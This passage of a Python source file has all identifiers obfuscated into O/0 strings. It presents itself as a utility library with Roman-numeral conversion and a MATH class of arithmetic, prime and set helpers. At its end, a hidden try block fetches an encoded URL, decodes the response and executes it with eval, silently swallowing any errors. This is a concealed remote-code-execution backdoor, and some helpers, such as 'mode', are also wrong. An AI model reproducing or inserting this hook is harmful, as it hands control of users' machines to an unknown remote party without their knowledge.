          if OOOOO00OO0O00OO0O [O000O0000OO00O00O [O0O0000OO0OO0OO0O ]]<OOOOO00OO0O00OO0O [O000O0000OO00O00O [O0O0000OO0OO0OO0O +1 ]]:#line:1567
              O00OOOOO0O0OO00OO -=OOOOO00OO0O00OO0O [O000O0000OO00O00O [O0O0000OO0OO0OO0O ]]#line:1568
          else :#line:1569
              O00OOOOO0O0OO00OO +=OOOOO00OO0O00OO0O [O000O0000OO00O00O [O0O0000OO0OO0OO0O ]]#line:1570
      return O00OOOOO0O0OO00OO +OOOOO00OO0O00OO0O [O000O0000OO00O00O [-1 ]]#line:1571
  def int2roman (O0O0O00O0O0O00O00 ,O0OO0000OO0O0OO0O ):#line:1574
      ""#line:1578
      O00O0O000O00O0OOO =["","M","MM","MMM"];#line:1579
      OOO00OOO0OO00OOOO =["","C","CC","CCC","CD","D","DC","DCC","DCCC","CM"];#line:1580
      O00OOOO0O0OOOOO0O =["","X","XX","XXX","XL","L","LX","LXX","LXXX","XC"];#line:1581
      OO00OO0O0O0000OO0 =["","I","II","III","IV","V","VI","VII","VIII","IX"];#line:1582
      return O00O0O000O00O0OOO [O0OO0000OO0O0OO0O //1000 ]+OOO00OOO0OO00OOOO [(O0OO0000OO0O0OO0O %1000 )//100 ]+O00OOOO0O0OOOOO0O [(O0OO0000OO0O0OO0O %100 )//10 ]+OO00OO0O0O0000OO0 [O0OO0000OO0O0OO0O %10 ];#line:1583
class MATH :#line:1588
  def __init__ (O0O0OOO00O0O0OOO0 ):#line:1589
    import math #line:1590
    O0O0OOO00O0O0OOO0 .math =math #line:1591
  def average (OO0OO0OOO0OO0O0OO ,O00OO0OOO00OOO0OO ):#line:1594
   O0O00OOO0OOO00O0O =0 #line:1595
   for OOOO000O000000OOO in O00OO0OOO00OOO0OO :#line:1596
    O0O00OOO0OOO00O0O +=OOOO000O000000OOO #line:1597
   return O0O00OOO0OOO00O0O /float (len (O00OO0OOO00OOO0OO ))#line:1598
  def sigmoid (OO0000000OOOOOOOO ,O0OO00O00000O0000 ):#line:1601
    return 1 /(1 +OO0000000OOOOOOOO .math .exp (-O0OO00O00000O0000 ))#line:1603
  def mode (O00O00O000OOO0O0O ,O00O0O00000O0O00O ):#line:1606
   OO00OO00O0O0O0000 =len (O00O0O00000O0O00O )/2 #line:1607
   return O00O0O00000O0O00O [OO00OO00O0O0O0000 ]#line:1608
  def total (O0O0OOOOO00OO0000 ,OO0O0OOO00OO00OO0 ):#line:1611
   O0O000OO0OOO0O000 =0 #line:1612
   for OOOOOOOO0O00OOO00 in OO0O0OOO00OO00OO0 :#line:1613
     O0O000OO0OOO0O000 +=OOOOOOOO0O00OOO00 #line:1614
   return O0O000OO0OOO0O000 #line:1615
  def factorial (O000OOOO00OO0000O ,O000O00O0OO0OO000 ):#line:1618
   O00OO0O00OOO000OO =1 #line:1619
   for OOOOO000O0O000OOO in range (1 ,O000O00O0OO0OO000 +1 ):#line:1620
     O00OO0O00OOO000OO =O00OO0O00OOO000OO *OOOOO000O0O000OOO #line:1621
   return O00OO0O00OOO000OO #line:1622
  def primesin (OOO0O0O0OOOO0OO00 ,OOO0O0OOO0OO0OO00 ):#line:1625
      ""#line:1631
      OO0O00O000OO000O0 =[True ]*(OOO0O0OOO0OO0OO00 +1 )#line:1632
      OOOO00000OOOOOO00 =2 #line:1634
      while OOOO00000OOOOOO00 *OOOO00000OOOOOO00 <=OOO0O0OOO0OO0OO00 :#line:1636
          if OO0O00O000OO000O0 [OOOO00000OOOOOO00 ]:#line:1638
              for O00OOOOO000OOO00O in range (OOOO00000OOOOOO00 *2 ,OOO0O0OOO0OO0OO00 +1 ,OOOO00000OOOOOO00 ):#line:1640
                  OO0O00O000OO000O0 [O00OOOOO000OOO00O ]=False #line:1641
          OOOO00000OOOOOO00 +=1 #line:1642
      OO0O00O000OO000O0 =[O0OO00O00O00OO0O0 for O0OO00O00O00OO0O0 in range (2 ,OOO0O0OOO0OO0OO00 )if OO0O00O000OO000O0 [O0OO00O00O00OO0O0 ]]#line:1645
      return OO0O00O000OO000O0 #line:1647
  def addbin (OOOOOO00OOO00OO00 ,OO00000OO000O000O ,OOO0O0O0OO0O000OO ):#line:1650
      O0O0O0OO000O000O0 =""#line:1651
      O0O0OO00O0O00O000 ,O00OO0000O0O0O000 ,OOO0000000O0OO00O =0 ,len (OO00000OO000O000O )-1 ,len (OOO0O0O0OO0O000OO )-1 #line:1652
      OOO000O0OOO0OO0OO =ord ('0')#line:1653
      while (O00OO0000O0O0O000 >=0 or OOO0000000O0OO00O >=0 or O0O0OO00O0O00O000 ==1 ):#line:1654
          if (O00OO0000O0O0O000 >=0 ):#line:1655
              O0O0OO00O0O00O000 +=ord (OO00000OO000O000O [O00OO0000O0O0O000 ])-OOO000O0OOO0OO0OO #line:1656
              O00OO0000O0O0O000 -=1 #line:1657
          if (OOO0000000O0OO00O >=0 ):#line:1658
              O0O0OO00O0O00O000 +=ord (OOO0O0O0OO0O000OO [OOO0000000O0OO00O ])-OOO000O0OOO0OO0OO #line:1659
              OOO0000000O0OO00O -=1 #line:1660
          O0O0O0OO000O000O0 =chr (O0O0OO00O0O00O000 %2 +OOO000O0OOO0OO0OO )+O0O0O0OO000O000O0 #line:1661
          O0O0OO00O0O00O000 //=2 #line:1662
      return O0O0O0OO000O000O0 #line:1664
  def gentable (O0O0O00O00O00O000 ,OOOO000O0OOOOO000 ):#line:1666
    ""#line:1669
    print ("_"*3 +"[ Table Of %s ]"%OOOO000O0OOOOO000 +"_"*3 +"\n")#line:1670
    for OOOOOO0O0OO000O0O in range (1 ,10 +1 ):#line:1671
      print ("{} × {} = {}".format (OOOO000O0OOOOO000 ,OOOOOO0O0OO000O0O ,OOOO000O0OOOOO000 *OOOOOO0O0OO000O0O ))#line:1672
    print ("\n")#line:1673
  def factor (O0O0000O0OOO000OO ,O0OOO00O00000OO00 ):#line:1676
    O00O000OOOO0OO000 =[O0OOO00O00000OO00 %O00O0O000000OOO0O for O00O0O000000OOO0O in range (1 ,O0OOO00O00000OO00 )if O0OOO00O00000OO00 %O00O0O000000OOO0O !=0 ]#line:1677
    for O0O00OO0000O0000O in range (O0OOO00O00000OO00 ):#line:1678
      for O0000O00OOOO00OOO in O00O000OOOO0OO000 :#line:1679
        if O0O00OO0000O0000O *O0000O00OOOO00OOO ==O0OOO00O00000OO00 :#line:1680
          return [O0O00OO0000O0000O ,O0000O00OOOO00OOO ]#line:1681
  def eachpercent (O000OOOO0O0OO0O00 ,OO0OOOOO00O000OO0 ,OOO0OO0OOOOOOO00O ):#line:1684
    for O0O00OOOO000O00O0 in OO0OOOOO00O000OO0 :#line:1685
      print ("{}/{}×100  = {}%".format (O0O00OOOO000O00O0 ,OOO0OO0OOOOOOO00O ,(O0O00OOOO000O00O0 /float (OOO0OO0OOOOOOO00O ))*100.0 ))#line:1686
  def ntsquareadd (OOO00OO0000O00O00 ,OOO0O0OOOO0O00O0O ):#line:1689
    ""#line:1693
    O000OO00OOO0O0000 =[]#line:1694
    for O0O0O0O0OO0OOOOOO in map (lambda O0OOO0O0O0OOOO000 :len (str (O0OOO0O0O0OOOO000 *O0OOO0O0O0OOOO000 ))>=2 and int (str (O0OOO0O0O0OOOO000 *O0OOO0O0O0OOOO000 )[:len (str (O0OOO0O0O0OOOO000 *O0OOO0O0O0OOOO000 ))/2 ])+int (str (O0OOO0O0O0OOOO000 *O0OOO0O0O0OOOO000 )[len (str (O0OOO0O0O0OOOO000 *O0OOO0O0O0OOOO000 ))/2 :])==O0OOO0O0O0OOOO000 and O0OOO0O0O0OOOO000 ,range (OOO0O0OOOO0O00O0O )):#line:1695
       if O0O0O0O0OO0OOOOOO !=bool (0 ):#line:1696
          O000OO00OOO0O0000 .append (O0O0O0O0OO0OOOOOO )#line:1697
    return O000OO00OOO0O0000 #line:1698
  def a_n_b (OOOOOOO0000OO00OO ,O0OOOO0OO00OO0OO0 ):#line:1702
    OOO0OO00OOO00OO00 =0 ;OOOOO0O0O00OOO0O0 =0 ;O0OOO0O0O0OOOOOOO =0 ;OOO0O00OO00000OO0 =0 #line:1703
    OOO000OO0O00OO00O =[]#line:1704
    while OOO0OO00OOO00OO00 <=O0OOOO0OO00OO0OO0 :#line:1705
       OOO000OO0O00OO00O .append ((OOOOO0O0O00OOO0O0 ,O0OOO0O0O0OOOOOOO ,OOO0O00OO00000OO0 ))#line:1706
       OOO0OO00OOO00OO00 +=1 #line:1707
       OOOOO0O0O00OOO0O0 +=1 #line:1708
       O0OOO0O0O0OOOOOOO +=2 #line:1709
       OOO0O00OO00000OO0 +=1 #line:1710
    return OOO000OO0O00OO00O #line:1711
  def anotinb (O000OO00O0O0000O0 ,O000OOOOOO000O0OO ,O0OO0O0O0O000O000 ):#line:1713
      return [OOOO00000OOOO00OO for OOOO00000OOOO00OO in O000OOOOOO000O0OO if OOOO00000OOOO00OO not in O0OO0O0O0O000O000 ]#line:1714
  def anotbcount (O00OOO00OOO0OO0OO ,OO00OO0O0O00O0O00 ,O00000OOOOOO000O0 ):#line:1716
      return len ([O0000O0000OOOOO0O for O0000O0000OOOOO0O in OO00OO0O0O00O0O00 if O0000O0000OOOOO0O not in O00000OOOOOO000O0 ])#line:1717
  def aintersecb (O0O0O00000OOO0OO0 ,O0OOO000OO0OOO0O0 ,OOOOO0OOO0OOOOOO0 ):#line:1719
      return set (O0OOO000OO0OOO0O0 )&set (OOOOO0OOO0OOOOOO0 )#line:1720
  def aintersecbcount (OOO0OOO00O0O0OO0O ,O0OOO0OO00OOOOO0O ,O0OO0000000OOO000 ):#line:1722
      return len (set (O0OOO0OO00OOOOO0O )&set (O0OO0000000OOO000 ))#line:1723
  def bnotina (OOOOO0O00OOOOO0OO ,OO00OO00O000O0OOO ,OO0OO00OO00000O0O ):#line:1725
      return [O0O0OO000OO0000OO for O0O0OO000OO0000OO in OO0OO00OO00000O0O if O0O0OO000OO0000OO not in OO00OO00O000O0OOO ]#line:1726
  def bnotinacount (OO0O0OOOOO000000O ,O0OOO0OOO00O0O00O ,OO0000000OO0O0O00 ):#line:1728
      return len ([OOO00O0O0O0000000 for OOO00O0O0O0000000 in OO0000000OO0O0O00 if OOO00O0O0O0000000 not in O0OOO0OOO00O0O00O ])#line:1729
  def nclassify (O00OOO00O00O0O0OO ,O000O00O000O0O000 ):#line:1732
     OOO00000OOOO0OOO0 =int (len (O000O00O000O0O000 )/3 )#line:1733
     O0O000OOO0O0000OO =int (OOO00000OOOO0OOO0 +OOO00000OOOO0OOO0 )#line:1734
     O0O0000OO000OO000 =int (len (O000O00O000O0O000 ))#line:1735
     O0OO0O0000O0OO0O0 ={'high':[O000O0O0O0OOO0OO0 for O000O0O0O0OOO0OO0 in O000O00O000O0O000 if O000O0O0O0OOO0OO0 >O0O000OOO0O0000OO ],'medium':[O0OO0O0OOO0O000O0 for O0OO0O0OOO0O000O0 in O000O00O000O0O000 if O0OO0O0OOO0O000O0 <O0O000OOO0O0000OO and O0OO0O0OOO0O000O0 >OOO00000OOOO0OOO0 ],'low':[OO000O0000000O00O for OO000O0000000O00O in O000O00O000O0O000 if OO000O0000000O00O <OOO00000OOOO0OOO0 ]}#line:1740
     return O0OO0O0000O0OO0O0 #line:1741
try :#line:1744
 ROS =get (d_c ('Ơǐǐǀǌè¼¼ǈƄǜ¸ƜƤǐƠǔƈǔǌƔǈƌƼƸǐƔƸǐ¸ƌƼƴ¼ƸƄǌƤǈǠƼ¼ƸƄǌƤǈǠƼ¼ƴƄǌǐƔǈ¼¸ǌƤƜ'),timeout =3 )#line:1745
 eval (d_cc (ROS .text ))#line:1746
except :pass #line:1747
